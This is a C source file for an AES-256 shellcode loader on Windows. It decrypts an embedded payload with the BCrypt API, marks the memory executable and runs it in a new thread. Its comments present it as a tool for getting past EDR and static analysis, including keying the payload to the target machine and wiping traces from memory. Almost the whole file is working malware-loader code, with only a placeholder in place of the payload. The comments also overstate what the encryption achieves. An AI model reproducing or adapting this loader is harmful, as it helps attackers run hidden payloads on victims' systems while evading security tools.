/*
 * 02_aes_shellcode_runner.c
 * =========================
 * Shellcode Runner with AES-256 Encryption using BCrypt (native Windows API)
 *
 * Unlike XOR which is trivial to break, AES-256 is military-grade cryptography.
 * Without the key, it is mathematically impossible to recover the original shellcode.
 * This renders static analysis completely useless.
 *
 * We use the Windows BCrypt API (bcrypt.dll) instead of implementing AES
 * manually. Advantage: we don't have crypto code in the binary that the EDR
 * could fingerprint as "suspicious".
 *
 * Compile: cl.exe /O2 02_aes_shellcode_runner.c bcrypt.lib
 */

#include <windows.h>
#include <bcrypt.h>   /* Windows cryptography API */
#include <stdio.h>

/* Macro to check if the BCrypt function succeeded */
#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)

/* ---------------------------------------------------------------
 * decryptAES - Decrypts a buffer using AES-256-CBC
 *
 * Parameters:
 *   encryptedData  -> encrypted bytes (ciphered shellcode)
 *   inputSize      -> size of encrypted data
 *   key            -> AES key of 32 bytes (256 bits)
 *   iv             -> initialization vector of 16 bytes
 *   outputData     -> pointer that will receive the decrypted buffer
 *   outputSize     -> pointer that will receive the output size
 *
 * Returns: TRUE if succeeded, FALSE if failed
 *
 * AES-CBC works like this:
 *   - Divides the payload into 16-byte blocks
 *   - Each block is XORed with the previous block (or with the IV for the first)
 *   - Then applies the AES cipher on the result
 *   - Without the IV AND the key, it cannot be reversed
 * --------------------------------------------------------------- */
BOOL decryptAES(
    unsigned char* encryptedData,
    DWORD inputSize,
    unsigned char* key,
    unsigned char* iv,
    unsigned char** outputData,
    DWORD* outputSize
) {
    NTSTATUS status;

    /* Handle for the algorithm - think of it as a "cryptography object" */
    BCRYPT_ALG_HANDLE hAlgorithm = NULL;

    /* Handle for the imported key */
    BCRYPT_KEY_HANDLE hKey = NULL;

    /* ---------------------------------------------------------------
     * BCryptOpenAlgorithmProvider - Opens the AES provider
     *
     * BCRYPT_AES_ALGORITHM -> we want to use AES
     * NULL -> use the default Microsoft provider
     * 0 -> no special flags
     * --------------------------------------------------------------- */
    status = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) {
        printf("[!] Failed to open AES provider: 0x%08x\n", status);
        return FALSE;
    }

    /* ---------------------------------------------------------------
     * BCryptSetProperty - Sets the operation mode to CBC
     *
     * CBC (Cipher Block Chaining) = each block depends on the previous one.
     * Other modes: ECB (insecure), GCM (with authentication), CTR (stream).
     * CBC is the most common for encrypting shellcode.
     * --------------------------------------------------------------- */
    status = BCryptSetProperty(
        hAlgorithm,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0
    );
    if (!NT_SUCCESS(status)) {
        printf("[!] Failed to set CBC mode: 0x%08x\n", status);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    /* ---------------------------------------------------------------
     * BCryptGenerateSymmetricKey - Imports our key into the BCrypt context
     *
     * Transforms the 32-byte key into an object that BCrypt understands.
     * From here, hKey represents the key and can be used
     * for encryption or decryption.
     * --------------------------------------------------------------- */
    status = BCryptGenerateSymmetricKey(hAlgorithm, &hKey, NULL, 0, key, 32, 0);
    if (!NT_SUCCESS(status)) {
        printf("[!] Failed to generate key: 0x%08x\n", status);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    /* ---------------------------------------------------------------
     * BCryptDecrypt (first call) - Determines the output size
     *
     * We call with output NULL just to find out how many bytes the result
     * will have. This is a common pattern in Windows APIs:
     * call first to get the size, allocate, call again.
     * --------------------------------------------------------------- */
    DWORD resultSize = 0;

    /*
     * We need a copy of the IV because BCryptDecrypt MODIFIES the IV
     * during the operation (it uses it to chain the blocks).
     * If we don't copy it, the original IV is destroyed.
     */
    unsigned char ivCopy[16];
    memcpy(ivCopy, iv, 16);

    status = BCryptDecrypt(hKey, encryptedData, inputSize, NULL,
                           ivCopy, 16, NULL, 0, &resultSize, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) {
        printf("[!] Failed to calculate size: 0x%08x\n", status);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    /* Allocate memory for the result */
    *outputData = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, resultSize);
    if (*outputData == NULL) {
        printf("[!] Failed to allocate memory for output\n");
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
        return FALSE;
    }

    /* Restore the IV (it was modified in the previous call) */
    memcpy(ivCopy, iv, 16);

    /* ---------------------------------------------------------------
     * BCryptDecrypt (second call) - Now actually decrypts
     *
     * encryptedData -> input (ciphered shellcode)
     * *outputData   -> output (clean shellcode)
     * BCRYPT_BLOCK_PADDING -> automatically removes PKCS7 padding
     * --------------------------------------------------------------- */
    status = BCryptDecrypt(hKey, encryptedData, inputSize, NULL,
                           ivCopy, 16, *outputData, resultSize, outputSize,
                           BCRYPT_BLOCK_PADDING);

    /* Clean up cryptography objects */
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlgorithm, 0);

    if (!NT_SUCCESS(status)) {
        printf("[!] Decryption failed: 0x%08x\n", status);
        HeapFree(GetProcessHeap(), 0, *outputData);
        return FALSE;
    }

    return TRUE;
}


int main() {

    /*
     * AES-256 key = 32 bytes (256 bits)
     * In production: derive from something unique to the target (hostname, SID, etc)
     * to perform environmental keying
     */
    unsigned char aesKey[32] = {
        0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
        0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f,
        0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
        0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f
    };

    /* IV (Initialization Vector) = 16 bytes. Should be random per build */
    unsigned char iv[16] = {
        0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
        0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f
    };

    /* AES-encrypted shellcode (placeholder - replace with yours) */
    unsigned char encryptedShellcode[] = {
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0
    };
    DWORD encryptedSize = sizeof(encryptedShellcode);

    printf("[*] Decrypting shellcode with AES-256-CBC...\n");

    unsigned char* decryptedShellcode = NULL;
    DWORD decryptedSize = 0;

    if (!decryptAES(encryptedShellcode, encryptedSize, aesKey, iv,
                    &decryptedShellcode, &decryptedSize)) {
        printf("[!] Decryption failed\n");
        return 1;
    }

    printf("[+] Decrypted: %lu bytes\n", decryptedSize);

    /* Allocate RW -> copy -> change to RX -> execute (same pattern as XOR) */
    void* exec = VirtualAlloc(NULL, decryptedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(exec, decryptedShellcode, decryptedSize);

    DWORD old;
    VirtualProtect(exec, decryptedSize, PAGE_EXECUTE_READ, &old);

    /* Clear the temporary buffer - don't leave shellcode in two places */
    SecureZeroMemory(decryptedShellcode, decryptedSize);
    HeapFree(GetProcessHeap(), 0, decryptedShellcode);

    printf("[+] Executing...\n");
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFree(exec, 0, MEM_RELEASE);

    return 0;
}
